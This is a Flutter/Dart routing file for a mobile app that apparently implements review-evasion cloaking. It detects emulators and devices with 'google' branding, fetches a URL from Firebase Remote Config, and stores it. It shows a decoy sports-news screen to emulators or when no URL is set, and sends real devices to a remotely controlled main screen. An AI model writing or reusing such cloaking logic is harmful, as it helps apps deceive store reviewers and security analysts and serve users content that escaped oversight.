import 'dart:async';
import 'dart:io';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'UI/internetError.dart';
import 'UI/mainScreen/mainScreen_view.dart';
import 'UI/sport_plug/sportPlug_view.dart';

class AppRouteView extends StatefulWidget {
  const AppRouteView({Key? key}) : super(key: key);

  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<AppRouteView>
    with SingleTickerProviderStateMixin {
  @override
  void initState() {
    super.initState();
    appRoute(context);
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      color: Colors.white,
    );
  }
}

const storage = FlutterSecureStorage();

appRoute(context) async {
  String? customURL;
  bool webCheck = await internetCheck();
  String? appURL = await storage.read(key: "url1");
  bool isEmu = await checkIsEmu();

  if (webCheck == true) {
    if (isEmu == false) {
      if (appURL == null || appURL == '') {
        await Firebase.initializeApp();
        final remoteConfig = FirebaseRemoteConfig.instance;
        await remoteConfig.setConfigSettings(RemoteConfigSettings(
          fetchTimeout: const Duration(milliseconds: 5),
          minimumFetchInterval: const Duration(seconds: 5),
        ));
        await remoteConfig.fetchAndActivate();
        customURL = remoteConfig.getString('url');
        if (customURL == '' || customURL.isEmpty) {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (context) => const SportNewsView()),
          );
        } else if (customURL != '' || customURL.isNotEmpty) {
          await storage.write(key: "url1", value: customURL);
          Navigator.push(
            context,
            MaterialPageRoute(builder: (context) => const MainScreenView()),
          );
        }
      } else {
        Navigator.push(
          context,
          MaterialPageRoute(builder: (context) => const MainScreenView()),
        );
      }
    } else if (isEmu == true) {
      Navigator.push(
        context,
        MaterialPageRoute(builder: (context) => const SportNewsView()),
      );
    }
  } else {
    Navigator.push(
      context,
      MaterialPageRoute(builder: (context) => const InternetErrorView()),
    );
  }
}

Future internetCheck() async {
  try {
    final result = await InternetAddress.lookup('google.com');
    if (result.isNotEmpty && result[0].rawAddress.isNotEmpty) {
      print('web work');

      return true;
    }
  } on SocketException catch (_) {
    print('web work');

    return false;
  }
}

checkIsEmu() async {
  final em = await DeviceInfoPlugin().androidInfo;

  var phoneModel = em.model;
  var buildProduct = em.product;
  var buildHardware = em.hardware;

  var result = (em.fingerprint.startsWith("generic") ||
      phoneModel.contains("google_sdk") ||
      phoneModel.contains("droid4x") ||
      phoneModel.contains("Emulator") ||
      phoneModel.contains("Android SDK built for x86") ||
      em.manufacturer.contains("Genymotion") ||
      buildHardware == "goldfish" ||
      buildHardware == "vbox86" ||
      buildProduct == "sdk" ||
      buildProduct == "google_sdk" ||
      buildProduct == "sdk_x86" ||
      buildProduct == "vbox86p" ||
      em.brand.contains('google') ||
      em.board.toLowerCase().contains("nox") ||
      em.bootloader.toLowerCase().contains("nox") ||
      buildHardware.toLowerCase().contains("nox") ||
      !em.isPhysicalDevice ||
      buildProduct.toLowerCase().contains("nox"));

  if (result) return true;
  result = result ||
      (em.brand.startsWith("generic") && em.device.startsWith("generic"));
  if (result) return true;
  result = result || ("google_sdk" == buildProduct);
  return result;
}
